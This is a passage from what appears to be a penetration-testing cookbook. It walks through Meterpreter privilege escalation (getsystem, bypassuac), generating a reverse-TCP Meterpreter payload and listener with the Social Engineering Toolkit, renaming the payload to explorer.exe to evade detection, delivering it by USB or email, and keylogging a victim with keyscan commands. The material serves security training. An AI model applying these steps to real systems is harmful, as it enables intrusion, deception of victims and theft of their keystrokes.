    In this recipe, we began with a compromised host and then used `Meterpreter` to
    impersonate the token of another user on the machine. The goal of the impersonation
    attack is to choose the highest level of user possible, preferably someone who
    is also connected across a domain, and use their account to dive further into
    the network.


    # Local privilege escalation attack


    In this recipe, we will escalate privileges on a compromised machine. Local privilege
    escalation allows us to gain access to system or domain user accounts, utilizing
    the current system to which we are attached.


    ## Getting ready


    To execute this recipe we will need the following:


    - A connection to the Internet or intranet

    - A compromised machine using the `Metasploit` framework is also required


    173

    ![](images/00165.jpeg)


    ## Escalatng Privileges


    ### How to do it...


    Let''s begin the process of performing a local privilege escalation attack from
    a `Meterpreter` shell. You will have to use `Metasploit` to attack a host in order
    to gain a `Meterpreter` shell. You can use one of the recipes in Chapter 6, `Exploiting
    Vulnerabilities`, to gain access to a host using `Metasploit`.


    1. Once you have gained access to your victim using a `Metasploit` exploit with
    a `Meterpreter` payload, await for your `Meterpreter` prompt to display:

    2. Next, to view the help file for the `getsystem` command, we run the `-h` option:

    ```

    getsystem -h

    ```

    3. Finally, we run `getsystem` without any attributes:

    ```

    getsystem

    ```

    If you are trying to gain access to a Windows 7 machine, you must run the `bypassuac`
    command before you can run the `getsystem` command.


    `BypassUAC` allows you to bypass the Microsoft User Account Control (http://windows.microsoft.com/en-us/windows7/products/features/user-account-control).
    The command is run as follows:

    ```bash

    run post/windows/escalate/bypassuac

    ```

    4. Next, we execute the final command to gain access.

    5. That''s it! We have successfully performed an escalation attack!


    ### How it works...


    In this recipe, we used `Meterpreter` to perform a local privilege escalation
    attack on our victim machine. We began the recipe from a `Meterpreter` shell.
    We then ran the `getsystem` command that allows `Meterpreter` to try and elevate
    our credentials on the system. If successful, we will have system level access
    on our victim''s machine.


    174

    ![](images/00166.jpeg)


    # Chapter 7: Mastering the Social Engineering Toolkit (SET)


    In this recipe, we will explore the `Social Engineering Toolkit(SET)`. `SET` is
    a framework that includes tools that allow you to attack a victim by using deception.
    `SET` was designed by David Kennedy. The tool has quickly become a standard in
    the arsenal of the penetration tester.


    ## How to do it...


    The steps for mastering the `SET` are as follows:


    1. Open a terminal window by pressing the terminal icon and visit the directory
    containing `SET`:

    ```bash

    se-toolkit

    ```

    2. Once accepted, you will be presented with the `SET` menu. The `SET` menu has
    the following options:

    - Social-Engineering Attacks

    - Fast-Track Penetration Testing

    - Third Party Modules

    - Update the `Metasploit Framework`

    - Update the `Social-Engineer Toolkit`

    - Update `SET` configuration

    - Help, Credits, and About

    - Exit the `Social-Engineer Toolkit`


    Before running an attack, it''s a good idea to update `SET` as updates come frequently
    from the author.


    175

    ![](images/00167.jpeg)


    ### Escalating Privileges


    The options can be seen in the following screenshot:


    3. For our purposes, we will choose the first option to launch a social engineering
    attack: 1

    4. We are now presented with a list of social engineering attacks as shown in
    the following screenshot. For our purposes, we will use the `Create a Payload
    and Listener` (option 4): 4

    176

    ![](images/00168.jpeg)

    5. Next, we are asked to enter the IP address for the payload to reverse connect.
    In this case, we type in our IP address:

    ```

    192.168.10.109

    ```

    177

    ![](images/00169.jpeg)

    6. You will be presented with a listing of payloads to generate for the `Payload
    and Listener` option as well as their descriptions. Choose `Windows Reverse_TCP
    Meterpreter`. This will allow us to connect to our target and execute `Meterpreter`
    payloads against it: 2

    7. Finally, you will be asked for a port to designate as the listener port. Port
    `443` is already chosen for you and we will choose this: 443

    8. Once the payload is completed, you will be asked to start the listener: Yes

    178

    ![](images/0170.jpeg)


    ### How it works...


    In this recipe, we explored the use of `SET`. `SET` has a menu that makes it simple
    to generate tools we can use to deceive victims. In the conclusion of our recipe,
    `SET` provides us with results.


    There''s more...


    # Delivering your payload to the victim


    The steps for delivering your payload to the victim are as follows:


    1. In `SET`, you will notice there is an executable `msf.exe`. To avoid detection,
    we rename it to `explorer.exe`:

    ```bash

    mv msf.exe explorer.exe

    ```

    2. We then list all items in the directory:

    ```bash

    ls

    ```

    3. Next, we want to rename the file to `healthyfiles`:

    ```bash

    mv explorer.exe healthyfiles

    ```

    4. Now that we have `healthyfiles`, we will zip it:

    ```bash

    zip healthyfiles

    ```

    5. In this case, we can place the file on a USB key and manually open it on the
    victim''s machine. We can also distribute it via e-mail systems.


    179

    ![](images/0171.jpeg)


    # Collecting the victim''s data


    In this recipe, we will explore how to collect data from a victim using `Metasploit`.
    There are several ways to accomplish this task, but we will explore recording
    a user''s keystro on the compromised machine. Collecting a victim''s data allows
    us to potentially gain additional information we can use for further exploits.


    ## Getting ready


    To execute this recipe we will need the following:


    - A connection to the Internet or intranet

    - A compromised machine using the `Metasploit` framework is also required


    ## How to do it...


    Let''s begin the process of collecting data from a victim from a `Meterpreter`
    shell. You will have to use `Metasploit` to attack a host in order to gain a `Meterpreter`
    shell. You can use one of the recipes in Chapter 6, `Exploiting Vulnerabilities`,
    to gain access to a host using `Metasploit`.


    1. Once you have gained access to your victim using a `Metasploit` exploit with
    a `Meterpreter` payload, await for your `Meterpreter` prompt to display:

    2. Next, we execute the following command to begin the keylogger:

    ```bash

    keyscan_start

    ```

    3. Finally, we issue the `keyscan_dump` command to output the user''s keystrokes
    to the screen:

    ```bash

    keyscan_dump

    ```


